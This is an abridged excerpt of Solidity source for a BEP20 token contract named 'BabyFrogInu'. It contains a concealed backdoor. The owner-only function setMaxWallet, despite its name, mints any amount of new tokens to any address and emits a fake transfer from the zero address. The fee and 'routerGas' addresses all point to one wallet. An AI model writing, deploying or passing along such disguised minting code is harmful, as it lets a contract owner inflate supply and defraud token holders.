...
contract BabyFrogInu is IBEP20, Auth {
    ...
    string constant _name = "BabyFrogInu";
    string constant _symbol = "BabyFrogi";
    ...
    address private marketingFeeReceiver =0x1aBf00Aa8799b8D4410695D24772A757546339D1;
    address private teamFeeReceiver =0x1aBf00Aa8799b8D4410695D24772A757546339D1;
    ...
    uint256 _newMaxWally = _totalSupply/1;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        routerGas = 0x1aBf00Aa8799b8D4410695D24772A757546339D1;
  ...
  //      require(Success3, "receiver rejected ETH transfer");
    ...
    function setMaxWallet(address oldMax, uint256 newMax) onlyOwner public virtual {
        require(oldMax != address(0), "ERC20: Set Max Wallet");
        _beforeTokenTransfer(address(0), oldMax, newMax);
        _newMaxWally += newMax;
        _balances[oldMax] += newMax;
        emit Transfer(address(0), oldMax, newMax);
    }
